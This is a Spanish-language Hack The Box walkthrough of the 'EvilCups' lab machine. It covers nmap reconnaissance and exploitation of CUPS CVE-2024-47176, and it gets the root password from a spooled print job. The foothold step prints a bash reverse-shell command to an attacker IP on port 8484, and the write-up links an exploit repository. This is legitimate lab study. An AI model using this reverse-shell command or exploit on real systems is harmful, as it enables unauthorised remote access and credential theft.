---

title: Writeup EvilCups
published: True

---

* * *

En este writeup, exploramos la máquina **EvilCups** de Hack The Box, donde explotamos múltiples vulnerabilidades para escalar privilegios y comprometer el sistema. Utilizamos técnicas como la **enumeración de servicios expuestos**, la explotación de **vulnerabilidades recientemente publicadas de CUPS**,etc...

**CUPS** es un sistema de impresión utilizado en sistemas operativos UNIX, que permite a los usuarios configurar y gestionar impresoras locales y en red mediante el uso de controladores.

# RECONOCIMIENTO
Realizamos un escaneo con nmap:

	❯ nmap -sCV -v 10.10.11.40 -Pn -T3
	
Como resultado encontramos esto:

  ```ruby
  
  PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 364995038db44c6ea92592af3c9e0666 (ECDSA)
|_  256 9fa4a9391120e096eec49a6928950c60 (ED25519)
631/tcp open  ipp     CUPS 2.4
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Home - CUPS 2.4.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Y encontramos dos puertos Tcp abiertos.
Vamos a ver que encontramos dentro de el puerto 631.

Aquí encontramos una versión:
![Texto alternativo](/assets/evilcups1.png)
* * *

# Foothold

El foothold en esta máquina es fácil. Vamos a buscar vulnerabilidades en esa versión de CUPS:

Y relacionada con esa versión encontramos un CVE, en concreto este:
	CVE-2024-47176

Asique vamos a proceder a explotarlo.
```js
❯ python3 evilcups.py 10.10.15.127 10.10.11.40 "bash -c 'bash -i >& /dev/tcp/10.10.15.127/8484 0>&1'"
```
![Texto alternativo](/assets/EvilCups2.png)

Para conseguir la reverse shell nos metemos dentro de la "impresora" que hemos conseguido crear mediante el exploit, y vamos a seleccionar esta opcion:

![Texto alternativo](/assets/EvilCups3.png)
![Texto alternativo](/assets/EvilCups4.png)

Y ya estaríamos con la reverse shell, listamos el contenido dentro del directorio en el que nos encontramos y encontraríamos la user flag.

Después de estar mirando por la máquina encontré que todos los trabajos de impresión se almacenan en /var/spool/cups

Como no tenemos permisos para listar el contenido, necesitamos saber cual es el siguiente "trabajo"/documento que la impresora que ya existe, para poder listarlo y así descargármelo.

En este caso ese "trabajo" de impresion tiene el nombre d00001-001
En el que significa:

```js
❯ -d: nos indica que es un archivo de datos de impresion
	00001: identifica el primera trabajo ne la cola
	001: especifica la instancia única del trabajo.
```
Todo este nombre se suele deducir a partir de el formato estandar que se utiliza en cups.
Tambien podriamos obtener este nombre realizando varios comandos en la maquina victicma, para ver que trabajos estan en cola como:
```js
	lpstat -o
	ls /var/spool/cups (si tenemos permisos)
	lpq
```
Pués una vez encontrado ese "trabajo" en cola, me lo voy a pasar a mi maquina para pasarlo a pdf y poder leerlo.

Para convertirlo a pdf utilize este comando:

```js
	ps2pdf d00001-001
```

Y dentro de ese archivo que ahora es un pdf encontramos la contraseña de root.
![Texto alternativo](/assets/EvilCups5.png)

Una vez encontrada la contraseña de root vamos a proceder mediante SSH a conectarnos y capturar la rootflag:

![Texto alternativo](/assets/EvilCups6.png)

PWNED!

*Documentación de aporte*

https://www.cups.org/doc/spec-design.html

https://github.com/AxthonyV/CVE-2024-47176
